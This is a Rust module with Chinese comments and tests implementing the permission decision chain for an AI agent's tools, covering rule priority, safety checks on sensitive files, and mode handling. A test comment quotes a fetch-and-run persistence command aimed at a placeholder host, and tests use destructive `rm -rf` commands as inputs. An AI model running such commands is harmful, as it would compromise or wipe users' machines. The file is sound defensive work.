//! 决策链。
//!
//! 七步，优先级从高到低：
//!
//! ```text
//! 1. 整工具 deny 规则          → Deny（任何模式下都生效）
//! 2. 整工具 ask 规则           → Ask
//! 3. tool.check_permissions()  → 工具特化逻辑
//! 4. 内容级 ask 规则 / 安全检查 → 即使 bypass 模式也要 Ask
//! 5. bypass 模式               → Allow
//! 6. 整工具 allow 规则         → Allow
//! 7. Passthrough               → 收敛为 Ask
//! ```
//!
//! # 第 4 步是整条链的关键
//!
//! `[约束]` 安全检查排在 bypass 模式**前面**。写 `.git/`、SSH 配置、
//! shell rc 这些操作对 bypass 免疫。
//!
//! 这不是冗余，是分层免疫：bypass 模式的语义是"我信任这个 agent 做常规
//! 开发工作"，不是"我允许它取得我机器的持久化执行权"。改 `.zshrc` 属于
//! 后者 —— 用户开 bypass 的时候没想过这个。
//!
//! # 第 3 步不能吃掉后面四步
//!
//! 工具返回 `Ask` 时，这条链面临一个选择：就地兑现，还是继续往下走。
//! 两种都对，取决于**这个 ask 想不想被 bypass 压过**：
//!
//! - 安全发现（`SafetyCheck`）、用户写的 ask 规则（`Rule`）→ 就地兑现。
//!   和第 4 步同理，用户开 bypass 不代表要撤回自己写过的"问我一下"。
//! - 例行同意请求（`Consent`，如"这个陌生域名可以抓吗"）→ 暂存后继续，
//!   到第 7 步之前才兑现。这本来就是"没有任何规则命中"的默认行为，
//!   而 bypass 的语义正是替用户回答这类默认询问。
//!
//! 靠 [`DecisionReason`] 区分而不是加开关，是因为这个信息本来就该在
//! 决策理由里 —— 一个说不出自己为什么问的 ask，UI 也解释不了。
//!
//! # 顺序不能靠"读起来合理"来验证
//!
//! 这七步里任意两步交换，绝大多数用例都还是绿的。下面每一步的**相对
//! 位置**都有对应的测试，测试名直接写明"谁必须压过谁"。
//!
//! 见 ARCHITECTURE.md §9.2

use riot_protocol::permission::{
    DecisionReason, PermissionContext, PermissionMode, PermissionResult, PermissionUpdate,
    RuleDecision, RuleSource, UpdateScope,
};
use riot_protocol::tool::Tool;

use crate::rules::{MatchMode, RuleSet};
use crate::safety;

/// 跑完整条决策链。
///
/// `content` 是用于内容级规则匹配的字符串 —— Bash 是命令，
/// Write 是路径。`None` 表示这个工具没有内容级维度。
pub fn decide(
    tool: &dyn Tool,
    input: &serde_json::Value,
    ctx: &PermissionContext,
    rules: &RuleSet,
) -> PermissionResult {
    let name = tool.name();
    let content = tool.target_path(input).map_or_else(
        || content_for(tool, input),
        |p| Some(p.to_string_lossy().into_owned()),
    );

    // ── 1. 整工具 deny ────────────────────────────────
    // 排在最前面，连工具自己的 check_permissions 都不给机会 ——
    // 用户明确禁掉一个工具之后，不该有任何代码路径能把它打开。
    if let Some(r) = rules.tool_rule(name, RuleDecision::Deny) {
        return PermissionResult::Deny {
            message: format!("`{name}` 被规则禁用"),
            reason: rule_reason(r.source, name),
        };
    }

    // ── 2. 整工具 ask ─────────────────────────────────
    if let Some(r) = rules.tool_rule(name, RuleDecision::Ask) {
        return finish_ask(
            format!("是否允许使用 `{name}`？"),
            vec![allow_tool_suggestion(name)],
            rule_reason(r.source, name),
            ctx,
        );
    }

    // ── 3. 工具特化逻辑 ───────────────────────────────
    // Bash 的命令分析在这里。它能 deny/ask，但它的 allow **不是终点** ——
    // 还要过第 4 步的安全检查。
    //
    // 它的 ask 也不都是终点：`Consent` 那种（"这个陌生域名可以抓吗"）要
    // 暂存下来继续往下走，让第 5 步的 bypass 和第 6 步的 allow 规则有机会
    // 压过它。其余的 ask（安全发现、用户写的 ask 规则）就地兑现。
    let tool_says = tool.check_permissions(input, ctx);
    let mut deferred_consent = None;
    match &tool_says {
        PermissionResult::Deny { .. } => return tool_says,
        PermissionResult::Ask { reason, .. } if reason.yields_to_bypass() => {
            deferred_consent = Some(tool_says.clone());
        }
        PermissionResult::Ask { .. } => return coerce_ask(tool_says, ctx),
        PermissionResult::Allow { .. } | PermissionResult::Passthrough => {}
    }

    // ── 4. 内容级 ask 规则 + 安全检查 ─────────────────
    // 这一步对 bypass 免疫。
    if let Some(c) = content.as_deref()
        && let Some(r) = rules.content_rule(name, c, RuleDecision::Deny, MatchMode::Raw)
    {
        return PermissionResult::Deny {
            message: format!("`{name}` 的这次调用被规则禁止"),
            reason: rule_reason(r.source, r.pattern.as_deref().unwrap_or_default()),
        };
    }

    if let Some(finding) = safety::check(tool, input, ctx) {
        return finish_ask(
            finding.message.clone(),
            finding.suggestions.clone(),
            DecisionReason::SafetyCheck {
                safety: finding.kind,
            },
            ctx,
        );
    }

    if let Some(c) = content.as_deref()
        && let Some(r) = rules.content_rule(name, c, RuleDecision::Ask, MatchMode::Raw)
    {
        return finish_ask(
            format!("是否允许 `{name}` 执行这次调用？"),
            vec![allow_content_suggestion(name, c)],
            rule_reason(r.source, r.pattern.as_deref().unwrap_or_default()),
            ctx,
        );
    }

    // ── 5. bypass 模式 ────────────────────────────────
    // 走到这里说明没有 deny、没有 ask 规则、没有安全问题。
    //
    // 无人值守模式其实在第 4 步就被 `finish_ask` 放行了，走不到这里；
    // 一并列出只是为了让这一步读起来不像"无人值守比放行更严"。
    let mode = ctx.mode.get();
    if matches!(
        mode,
        PermissionMode::BypassPermissions | PermissionMode::Unattended
    ) {
        return PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Mode { mode },
        };
    }

    // ── 6. 显式 allow ─────────────────────────────────
    if let Some(r) = rules.tool_rule(name, RuleDecision::Allow) {
        return PermissionResult::Allow {
            updated_input: None,
            reason: rule_reason(r.source, name),
        };
    }
    if let Some(c) = content.as_deref()
        && let Some(r) = rules.content_rule(name, c, RuleDecision::Allow, MatchMode::Raw)
    {
        return PermissionResult::Allow {
            updated_input: None,
            reason: rule_reason(r.source, r.pattern.as_deref().unwrap_or_default()),
        };
    }

    // 工具自己说了 allow，且过了安全检查
    if let PermissionResult::Allow { .. } = tool_says {
        return tool_says;
    }

    // 第 3 步暂存的同意请求：bypass 和 allow 规则都没能压过它，兑现。
    //
    // `[约束]` 必须在 `mode_default` **之前**。同意请求主要来自 WebFetch，
    // 而它 `is_read_only()` 返回 true —— 交给 mode_default 的话会被当成
    // "只读操作在所有模式下都放行"，域名确认就整个失效了。
    if let Some(ask) = deferred_consent {
        return coerce_ask(ask, ctx);
    }

    // ── 7. 模式兜底 ───────────────────────────────────
    mode_default(tool, input, ctx)
}

/// 没有任何规则命中时，由模式决定。
fn mode_default(
    tool: &dyn Tool,
    input: &serde_json::Value,
    ctx: &PermissionContext,
) -> PermissionResult {
    let mode = ctx.mode.get();
    let read_only = tool.is_read_only(input);

    // 只读操作在所有模式下都放行。它们改不了任何东西，
    // 为它们弹窗只会训练用户无脑点"允许"。
    if read_only {
        return PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Mode { mode },
        };
    }

    match mode {
        // 只读规划模式：写操作一律拒绝，不问。
        // 问了也没用 —— 用户进 plan 模式就是不想让它动手。
        PermissionMode::Plan => PermissionResult::Deny {
            message: format!("规划模式下不能使用 `{}`。先退出规划模式。", tool.name()),
            reason: DecisionReason::Mode { mode },
        },

        PermissionMode::AcceptEdits if is_edit_tool(tool) => PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Mode { mode },
        },

        PermissionMode::BypassPermissions | PermissionMode::Unattended => {
            PermissionResult::Allow {
                updated_input: None,
                reason: DecisionReason::Mode { mode },
            }
        }

        _ => {
            // 有内容维度的工具给内容级建议（精确命令、具体路径）。
            // 整工具建议对 Bash 意味着"总是允许任意命令" —— 用户在一个
            // 具体命令的弹窗上点"总是允许"，绝不是这个意思。
            let content = tool.target_path(input).map_or_else(
                || content_for(tool, input),
                |p| Some(p.to_string_lossy().into_owned()),
            );
            let suggestion = content.as_deref().map_or_else(
                || allow_tool_suggestion(tool.name()),
                |c| allow_content_suggestion(tool.name(), c),
            );
            finish_ask(
                format!("是否允许 `{}`？", tool.name()),
                vec![suggestion],
                DecisionReason::Mode { mode },
                ctx,
            )
        }
    }
}

/// 生成 Ask，但先看这个 Ask 该不该、能不能真的问出去。
///
/// 每一条 ask 都从这里出去，所以"什么情况下不问"的判断集中在这一个函数里。
///
/// `[约束]` 两种情况下 ask 必须变成 deny：
///
/// - `dontAsk` 模式
/// - `can_prompt_user == false`（异步子 agent 没有 UI）
///
/// 这两种下变成 allow 是绝对不行的。"**没人能**回答"不等于"默认同意"——
/// 那会让无人值守场景成为绕过所有权限的后门。
///
/// [`PermissionMode::Unattended`] 是另一回事：用户在场、看着警告、
/// 亲手选的"别问了，都放行"。那是"**不必**回答"，可以是 allow。
/// 这两者读起来很像，混为一谈就等于开后门。
///
/// `[约束]` 无人值守的放行**不适用于提问**（[`DecisionReason::UserChoice`]，
/// 即 `AskUserQuestion` 的选项卡）。权限询问要的是**许可**，allow 就是
/// 完整的回答；提问要的是**信息**，allow 什么都没答 —— 工具拿着空选择
/// 跑 `call`，唯一可能的结局是"没有收到用户的选择"的失败：卡片没弹出来，
/// 用户看到一张红色的失败卡，模型白跑一轮。无人值守的语义是"权限问题
/// 别拦着任务"，不是"把模型主动要的决定静默扔掉"。用户真不在场时，
/// 由宿主的 ask 超时按拒绝兜底（那条路本来就是为没人回应设计的）。
fn finish_ask(
    message: String,
    suggestions: Vec<PermissionUpdate>,
    reason: DecisionReason,
    ctx: &PermissionContext,
) -> PermissionResult {
    let mode = ctx.mode.get();

    if mode == PermissionMode::DontAsk || !ctx.can_prompt_user {
        return PermissionResult::Deny {
            message: format!("{message}（无法询问，已拒绝）"),
            reason,
        };
    }

    if mode == PermissionMode::Unattended
        && !matches!(reason, DecisionReason::UserChoice { .. })
    {
        return PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Mode { mode },
        };
    }

    PermissionResult::Ask {
        message,
        suggestions,
        reason,
    }
}

/// 把工具返回的 Ask 过一遍"能不能问"的判断。
fn coerce_ask(result: PermissionResult, ctx: &PermissionContext) -> PermissionResult {
    match result {
        PermissionResult::Ask {
            message,
            suggestions,
            reason,
        } => finish_ask(message, suggestions, reason, ctx),
        other => other,
    }
}

fn is_edit_tool(tool: &dyn Tool) -> bool {
    matches!(tool.name(), "Edit" | "Write" | "MultiEdit" | "NotebookEdit")
}

/// 内容级规则要匹配的字符串。
fn content_for(tool: &dyn Tool, input: &serde_json::Value) -> Option<String> {
    // Bash 用命令本身。其它工具默认没有内容维度 —— 返回 None 而不是
    // 把整个 input 序列化成 JSON：那样规则模式得写成 JSON 片段，
    // 没人写得对，而写错的规则会静默不匹配。
    if tool.name() == "Bash" {
        return input
            .get("command")
            .and_then(|v| v.as_str())
            .map(ToOwned::to_owned);
    }
    None
}

fn rule_reason(source: RuleSource, pattern: &str) -> DecisionReason {
    DecisionReason::Rule {
        source,
        pattern: pattern.to_owned(),
    }
}

fn allow_tool_suggestion(tool: &str) -> PermissionUpdate {
    PermissionUpdate::AddRule {
        tool: tool.to_owned(),
        pattern: None,
        decision: RuleDecision::Allow,
        scope: UpdateScope::Session,
    }
}

fn allow_content_suggestion(tool: &str, content: &str) -> PermissionUpdate {
    PermissionUpdate::AddRule {
        tool: tool.to_owned(),
        pattern: Some(content.to_owned()),
        decision: RuleDecision::Allow,
        // 默认只记住本次会话。写进配置文件是更重的决定，
        // 应该由用户在 UI 里显式选，而不是这里替他决定。
        scope: UpdateScope::Session,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::{PermTool, ctx_with, rules_of};
    use riot_protocol::permission::{PermissionRule, SafetyKind};
    use pretty_assertions::assert_eq;

    fn input(path: &str) -> serde_json::Value {
        serde_json::json!({ "path": path })
    }

    fn cmd(c: &str) -> serde_json::Value {
        serde_json::json!({ "command": c })
    }

    fn rule(
        tool: &str,
        pattern: Option<&str>,
        d: RuleDecision,
        s: RuleSource,
    ) -> PermissionRule {
        PermissionRule {
            tool: tool.into(),
            pattern: pattern.map(Into::into),
            decision: d,
            source: s,
        }
    }

    fn behavior(r: &PermissionResult) -> &'static str {
        match r {
            PermissionResult::Allow { .. } => "allow",
            PermissionResult::Ask { .. } => "ask",
            PermissionResult::Deny { .. } => "deny",
            PermissionResult::Passthrough => "passthrough",
        }
    }

    // ── 步骤间的相对优先级 ────────────────────────────
    //
    // 这七步里任意两步交换，绝大多数用例都还是绿的。
    // 下面每个测试盯的是一对步骤的相对位置。

    #[test]
    fn 整工具_deny_压过一切() {
        // 包括 bypass 模式和工具自己的 allow
        let tool = PermTool::writer("Write").says(PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Sandbox,
        });
        let ctx = ctx_with(PermissionMode::BypassPermissions);
        let rules = rules_of(vec![rule(
            "Write",
            None,
            RuleDecision::Deny,
            RuleSource::User,
        )]);

        assert_eq!(
            behavior(&decide(&tool, &input("/work/a"), &ctx, &rules)),
            "deny",
            "用户明确禁掉一个工具后，不该有任何路径能把它打开"
        );
    }

    #[test]
    fn 整工具_ask_压过工具自己的_allow() {
        let tool = PermTool::writer("Write").says(PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Sandbox,
        });
        let rules = rules_of(vec![rule(
            "Write",
            None,
            RuleDecision::Ask,
            RuleSource::User,
        )]);

        assert_eq!(
            behavior(&decide(
                &tool,
                &input("/work/a"),
                &ctx_with(PermissionMode::Default),
                &rules
            )),
            "ask"
        );
    }

    #[test]
    fn 工具的_deny_压过_bypass() {
        // Bash 的命令分析判定危险时，bypass 也不能放行
        let tool = PermTool::writer("Bash").says(PermissionResult::Deny {
            message: "命令含注入模式".into(),
            reason: DecisionReason::SafetyCheck {
                safety: SafetyKind::CommandInjection,
            },
        });

        assert_eq!(
            behavior(&decide(
                &tool,
                &cmd("evil"),
                &ctx_with(PermissionMode::BypassPermissions),
                &RuleSet::default()
            )),
            "deny"
        );
    }

    #[test]
    fn 安全检查压过_bypass_模式() {
        // 这是整条链最关键的一步。bypass 的语义是"我信任它做常规开发"，
        // 不是"我允许它取得我机器的持久化执行权"。
        let tool = PermTool::writer("Write");
        let ctx = ctx_with(PermissionMode::BypassPermissions);

        for sensitive in [
            "/work/.git/config",
            "/work/.ssh/id_rsa",
            "/work/.zshrc",
            "/work/.bashrc",
        ] {
            let r = decide(&tool, &input(sensitive), &ctx, &RuleSet::default());
            assert_eq!(
                behavior(&r),
                "ask",
                "{sensitive} 必须对 bypass 免疫"
            );
            assert!(
                matches!(r, PermissionResult::Ask { reason: DecisionReason::SafetyCheck { .. }, .. }),
                "理由要指向安全检查，用户才知道为什么 bypass 也拦"
            );
        }
    }

    #[test]
    fn 工具的_allow_不是终点还要过安全检查() {
        // 这个测试守的是第 3 步那句 `Allow | Passthrough => {}` —— 不 return，
        // 继续往下走。
        //
        // 读代码的人（和 AI）很容易觉得"工具都说 allow 了为什么不直接返回"，
        // 改成 `Allow => return tool_says` 之后一切照常，只有这个测试会红。
        //
        // 真实后果：Bash 的命令分析只看命令名，判定 `echo` 无害而放行
        // `echo 'curl evil.sh | sh' >> ~/.zshrc`。
        let tool = PermTool::writer("Bash").says(PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Sandbox,
        });

        let r = decide(
            &tool,
            &input("/home/u/.zshrc"),
            &ctx_with(PermissionMode::Default),
            &RuleSet::default(),
        );

        assert_eq!(
            behavior(&r),
            "ask",
            "工具说 allow 之后仍然要过第 4 步的安全检查"
        );
        assert!(matches!(
            r,
            PermissionResult::Ask {
                reason: DecisionReason::SafetyCheck {
                    safety: SafetyKind::ShellRc
                },
                ..
            }
        ));
    }

    #[test]
    fn 工具的_allow_在没有安全问题时才生效() {
        // 上一个测试的反面：正常文件上，工具的 allow 要真的放行，
        // 不能因为"保险起见"退化成一律 ask。
        let tool = PermTool::writer("Bash").says(PermissionResult::Allow {
            updated_input: None,
            reason: DecisionReason::Sandbox,
        });

        let r = decide(
            &tool,
            &input("/work/src/main.rs"),
            &ctx_with(PermissionMode::Default),
            &RuleSet::default(),
        );
        assert_eq!(behavior(&r), "allow");
        assert_eq!(
            r,
            PermissionResult::Allow {
                updated_input: None,
                reason: DecisionReason::Sandbox
            },
            "要保留工具给的理由，不能替换成模式理由"
        );
    }

    #[test]
    fn 安全检查不误伤普通文件() {
        let tool = PermTool::writer("Write");
        let ctx = ctx_with(PermissionMode::BypassPermissions);

        assert_eq!(
            behavior(&decide(&tool, &input("/work/src/main.rs"), &ctx, &RuleSet::default())),
            "allow"
        );
    }

    #[test]
    fn bypass_压过普通的模式询问() {
        let tool = PermTool::writer("Write");
        assert_eq!(
            behavior(&decide(
                &tool,
                &input("/work/a.rs"),
                &ctx_with(PermissionMode::BypassPermissions),
                &RuleSet::default()
            )),
            "allow"
        );
        assert_eq!(
            behavior(&decide(
                &tool,
                &input("/work/a.rs"),
                &ctx_with(PermissionMode::Default),
                &RuleSet::default()
            )),
            "ask"
        );
    }

    /// 复刻 WebFetch 的形状：只读工具，对陌生目标发同意请求。
    fn consent_tool() -> PermTool {
        PermTool::read_only("WebFetch").says(PermissionResult::Ask {
            message: "是否允许抓取 example.com？".into(),
            suggestions: Vec::new(),
            reason: DecisionReason::Consent {
                what: "domain:example.com".into(),
            },
        })
    }

    #[test]
    fn bypass_压过工具的同意请求() {
        // 用户开了「全部放行」还被反复问域名，是这条链最早的真实 bug：
        // 第 3 步的 ask 直接 return，第 5 步的 bypass 永远够不着。
        assert_eq!(
            behavior(&decide(
                &consent_tool(),
                &serde_json::json!({ "url": "https://example.com" }),
                &ctx_with(PermissionMode::BypassPermissions),
                &RuleSet::default()
            )),
            "allow",
            "开了全部放行就不该再问域名"
        );
    }

    #[test]
    fn 同意请求在默认模式下仍然要问() {
        // 上一条测试的反面。只放宽 bypass，不能顺手把确认功能弄没了。
        let r = decide(
            &consent_tool(),
            &serde_json::json!({ "url": "https://example.com" }),
            &ctx_with(PermissionMode::Default),
            &RuleSet::default(),
        );
        assert_eq!(behavior(&r), "ask");
        assert!(
            matches!(
                &r,
                PermissionResult::Ask { message, .. } if message.contains("example.com")
            ),
            "要保留工具给的那句话，不能退化成通用文案"
        );
    }

    #[test]
    fn 同意请求不能被只读兜底吞掉() {
        // `[约束]` 暂存的同意请求必须在 mode_default **之前**兑现。
        //
        // WebFetch 的 is_read_only() 是 true，而 mode_default 对只读工具
        // 一律放行。少了那道提前返回，这条链会在每个模式下静默放行所有
        // 抓取 —— 比"老是弹框"严重得多，而且没有任何报错。
        for mode in [
            PermissionMode::Default,
            PermissionMode::AcceptEdits,
            PermissionMode::Plan,
        ] {
            assert_eq!(
                behavior(&decide(
                    &consent_tool(),
                    &serde_json::json!({ "url": "https://example.com" }),
                    &ctx_with(mode),
                    &RuleSet::default()
                )),
                "ask",
                "{mode:?} 下不该静默放行"
            );
        }
    }

    #[test]
    fn 用户写的_ask_规则不被_bypass_压过() {
        // 和同意请求的区别就在这：这是用户亲手写下的"问我一下"。
        // 切到 bypass 不代表要撤回它。
        let tool = PermTool::read_only("WebFetch").says(PermissionResult::Ask {
            message: "是否允许抓取 example.com？".into(),
            suggestions: Vec::new(),
            reason: DecisionReason::Rule {
                source: RuleSource::User,
                pattern: "domain:example.com".into(),
            },
        });

        assert_eq!(
            behavior(&decide(
                &tool,
                &serde_json::json!({ "url": "https://example.com" }),
                &ctx_with(PermissionMode::BypassPermissions),
                &RuleSet::default()
            )),
            "ask"
        );
    }

    #[test]
    fn 同意请求在_dont_ask_下转成_deny() {
        assert_eq!(
            behavior(&decide(
                &consent_tool(),
                &serde_json::json!({ "url": "https://example.com" }),
                &ctx_with(PermissionMode::DontAsk),
                &RuleSet::default()
            )),
            "deny",
            "无人值守场景下没人能回答，只能拒绝"
        );
    }

    #[test]
    fn deny_规则压过同意请求() {
        let rules = rules_of(vec![rule(
            "WebFetch",
            None,
            RuleDecision::Deny,
            RuleSource::User,
        )]);
        assert_eq!(
            behavior(&decide(
                &consent_tool(),
                &serde_json::json!({ "url": "https://example.com" }),
                &ctx_with(PermissionMode::BypassPermissions),
                &rules
            )),
            "deny"
        );
    }

    #[test]
    fn 内容级_deny_压过整工具_allow() {
        // Bash 整体放行，但某个具体命令被禁
        let tool = PermTool::writer("Bash");
        let rules = rules_of(vec![
            rule("Bash", None, RuleDecision::Allow, RuleSource::User),
            rule("Bash", Some("rm *"), RuleDecision::Deny, RuleSource::Policy),
        ]);

        assert_eq!(
            behavior(&decide(
                &tool,
                &cmd("rm -rf /tmp/x"),
                &ctx_with(PermissionMode::Default),
                &rules
            )),
            "deny"
        );
        assert_eq!(
            behavior(&decide(
                &tool,
                &cmd("ls"),
                &ctx_with(PermissionMode::Default),
                &rules
            )),
            "allow"
        );
    }

    // ── ask 的收敛 ────────────────────────────────────

    #[test]
    fn dontask_模式把_ask_变成_deny_而不是_allow() {
        // "没人能回答"不等于"默认同意"。反过来的话，
        // 无人值守场景就成了绕过所有权限的后门。
        let tool = PermTool::writer("Write");
        let ctx = ctx_with(PermissionMode::DontAsk);

        assert_eq!(
            behavior(&decide(&tool, &input("/work/a.rs"), &ctx, &RuleSet::default())),
            "deny"
        );
    }

    #[test]
    fn 不能弹窗时_ask_变成_deny() {
        // 异步子 agent 没有 UI
        let tool = PermTool::writer("Write");
        let mut ctx = ctx_with(PermissionMode::Default);
        ctx.can_prompt_user = false;

        assert_eq!(
            behavior(&decide(&tool, &input("/work/a.rs"), &ctx, &RuleSet::default())),
            "deny"
        );
    }

    #[test]
    fn 不能弹窗也不影响_allow() {
        // 收敛只针对 ask。本来就该放行的不受影响。
        let tool = PermTool::read_only("Read");
        let mut ctx = ctx_with(PermissionMode::Default);
        ctx.can_prompt_user = false;

        assert_eq!(
            behavior(&decide(&tool, &input("/work/a.rs"), &ctx, &RuleSet::default())),
            "allow"
        );
    }

    #[test]
    fn passthrough_收敛为_ask_不是_allow() {
        // 工具不表态时交给通用系统，而不是默认放行
        let tool = PermTool::writer("Custom");
        assert_eq!(
            behavior(&decide(
                &tool,
                &input("/work/a.rs"),
                &ctx_with(PermissionMode::Default),
                &RuleSet::default()
            )),
            "ask"
        );
    }

    /// 复刻 AskUserQuestion 的形状：提问用的 ask，理由是 UserChoice。
    fn question_tool() -> PermTool {
        PermTool::read_only("AskUserQuestion").says(PermissionResult::Ask {
            message: "模型想让你做一个决定".into(),
            suggestions: Vec::new(),
            reason: DecisionReason::UserChoice { remembered: false },
        })
    }

    #[test]
    fn 无人值守不吞掉提问() {
        // 权限询问要的是许可，allow 就是完整回答；提问要的是**信息**，
        // allow 什么都没答。曾经的真实 bug：无人值守把这个 ask 收敛成
        // allow，卡片不弹，AskUserQuestion 的 call 拿着空选择跑，唯一的
        // 结局是"没有收到用户的选择"失败 —— 用户看到一张红色失败卡，
        // 问题却从没出现过。
        for mode in [
            PermissionMode::Unattended,
            PermissionMode::BypassPermissions,
            PermissionMode::Auto,
            PermissionMode::Default,
        ] {
            assert_eq!(
                behavior(&decide(
                    &question_tool(),
                    &serde_json::json!({}),
                    &ctx_with(mode),
                    &RuleSet::default()
                )),
                "ask",
                "{mode:?} 下提问被吞掉了"
            );
        }
    }

    #[test]
    fn 无人值守的放行只豁免提问() {
        // 上一条的反面：UserChoice 的豁免不能顺手把无人值守的"全部放行"
        // 弄没了 —— 连安全检查它都压过（用户看着警告亲手选的档位）。
        let ctx = ctx_with(PermissionMode::Unattended);
        assert_eq!(
            behavior(&decide(
                &PermTool::writer("Write"),
                &input("/work/a.rs"),
                &ctx,
                &RuleSet::default()
            )),
            "allow"
        );
        assert_eq!(
            behavior(&decide(
                &PermTool::writer("Write"),
                &input("/work/.zshrc"),
                &ctx,
                &RuleSet::default()
            )),
            "allow",
            "无人值守连安全检查一起放行，这是它和 bypass 的区别"
        );
    }

    #[test]
    fn 提问在没人能答时是拒绝不是空答案() {
        // DontAsk 和子 agent（can_prompt_user=false）下没人能点卡片。
        // 收敛成 deny 模型立刻知道该换路；收敛成 allow 的话工具拿空选择
        // 跑，失败得更晚、报错更绕。
        assert_eq!(
            behavior(&decide(
                &question_tool(),
                &serde_json::json!({}),
                &ctx_with(PermissionMode::DontAsk),
                &RuleSet::default()
            )),
            "deny"
        );

        let mut ctx = ctx_with(PermissionMode::Unattended);
        ctx.can_prompt_user = false;
        assert_eq!(
            behavior(&decide(
                &question_tool(),
                &serde_json::json!({}),
                &ctx,
                &RuleSet::default()
            )),
            "deny",
            "无人值守的豁免只让提问活到弹窗，问不出去时仍然要拒"
        );
    }

    // ── 模式语义 ──────────────────────────────────────

    #[test]
    fn 只读工具在所有模式下都放行() {
        // 为只读操作弹窗只会训练用户无脑点"允许"
        let tool = PermTool::read_only("Read");
        for mode in [
            PermissionMode::Default,
            PermissionMode::AcceptEdits,
            PermissionMode::DontAsk,
            PermissionMode::BypassPermissions,
        ] {
            assert_eq!(
                behavior(&decide(
                    &tool,
                    &input("/work/a.rs"),
                    &ctx_with(mode),
                    &RuleSet::default()
                )),
                "allow",
                "{mode:?}"
            );
        }
    }

    #[test]
    fn 规划模式拒绝写操作而不是询问() {
        // 用户进 plan 模式就是不想让它动手，问了也没用
        let tool = PermTool::writer("Write");
        let r = decide(
            &tool,
            &input("/work/a.rs"),
            &ctx_with(PermissionMode::Plan),
            &RuleSet::default(),
        );
        assert_eq!(behavior(&r), "deny");
    }

    #[test]
    fn 规划模式仍然允许只读() {
        let tool = PermTool::read_only("Read");
        assert_eq!(
            behavior(&decide(
                &tool,
                &input("/work/a.rs"),
                &ctx_with(PermissionMode::Plan),
                &RuleSet::default()
            )),
            "allow"
        );
    }

    #[test]
    fn accept_edits_只放行编辑类工具() {
        let ctx = ctx_with(PermissionMode::AcceptEdits);

        assert_eq!(
            behavior(&decide(
                &PermTool::writer("Edit"),
                &input("/work/a.rs"),
                &ctx,
                &RuleSet::default()
            )),
            "allow"
        );
        assert_eq!(
            behavior(&decide(
                &PermTool::writer("Bash"),
                &cmd("rm -rf /"),
                &ctx,
                &RuleSet::default()
            )),
            "ask",
            "acceptEdits 是自动接受编辑，不是自动接受一切"
        );
    }

    #[test]
    fn accept_edits_下敏感文件仍要问() {
        let r = decide(
            &PermTool::writer("Edit"),
            &input("/work/.git/config"),
            &ctx_with(PermissionMode::AcceptEdits),
            &RuleSet::default(),
        );
        assert_eq!(behavior(&r), "ask");
    }

    // ── 决策理由 ──────────────────────────────────────

    #[test]
    fn 每个决策都带理由() {
        // 用户报"为什么它问我这个"时要能立刻回答
        let cases = [
            (
                PermTool::writer("Write"),
                input("/work/a.rs"),
                ctx_with(PermissionMode::Default),
                RuleSet::default(),
            ),
            (
                PermTool::writer("Write"),
                input("/work/.git/x"),
                ctx_with(PermissionMode::BypassPermissions),
                RuleSet::default(),
            ),
            (
                PermTool::writer("Bash"),
                cmd("ls"),
                ctx_with(PermissionMode::Default),
                rules_of(vec![rule("Bash", None, RuleDecision::Deny, RuleSource::Policy)]),
            ),
        ];

        for (tool, inp, ctx, rules) in cases {
            let r = decide(&tool, &inp, &ctx, &rules);
            assert!(
                !matches!(r, PermissionResult::Passthrough),
                "决策链不该返回 Passthrough"
            );
            let has_reason = match &r {
                PermissionResult::Allow { .. }
                | PermissionResult::Ask { .. }
                | PermissionResult::Deny { .. } => true,
                PermissionResult::Passthrough => false,
            };
            assert!(has_reason);
        }
    }

    #[test]
    fn ask_带上可操作的建议() {
        // UI 的"永久同意"按钮要有东西可点
        let r = decide(
            &PermTool::writer("Write"),
            &input("/work/a.rs"),
            &ctx_with(PermissionMode::Default),
            &RuleSet::default(),
        );

        match r {
            PermissionResult::Ask { suggestions, .. } => {
                assert!(!suggestions.is_empty(), "没有建议的话弹窗只能一次次问");
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn 模式兜底的建议是内容级而不是整工具() {
        // "总是允许 Write(/work/a.rs)" 和 "总是允许 Write（任何文件）"
        // 是两个完全不同量级的授权。弹窗上下文是具体文件，建议就该是它。
        let r = decide(
            &PermTool::writer("Write"),
            &input("/work/a.rs"),
            &ctx_with(PermissionMode::Default),
            &RuleSet::default(),
        );

        match r {
            PermissionResult::Ask { suggestions, .. } => match &suggestions[0] {
                PermissionUpdate::AddRule { pattern, .. } => {
                    assert_eq!(pattern.as_deref(), Some("/work/a.rs"));
                }
                other => panic!("{other:?}"),
            },
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn 建议默认只记住本次会话() {
        // 写进配置文件是更重的决定，该由用户在 UI 里显式选
        let r = decide(
            &PermTool::writer("Write"),
            &input("/work/a.rs"),
            &ctx_with(PermissionMode::Default),
            &RuleSet::default(),
        );

        match r {
            PermissionResult::Ask { suggestions, .. } => match &suggestions[0] {
                PermissionUpdate::AddRule { scope, .. } => {
                    assert_eq!(*scope, UpdateScope::Session);
                }
                other => panic!("{other:?}"),
            },
            other => panic!("{other:?}"),
        }
    }
}
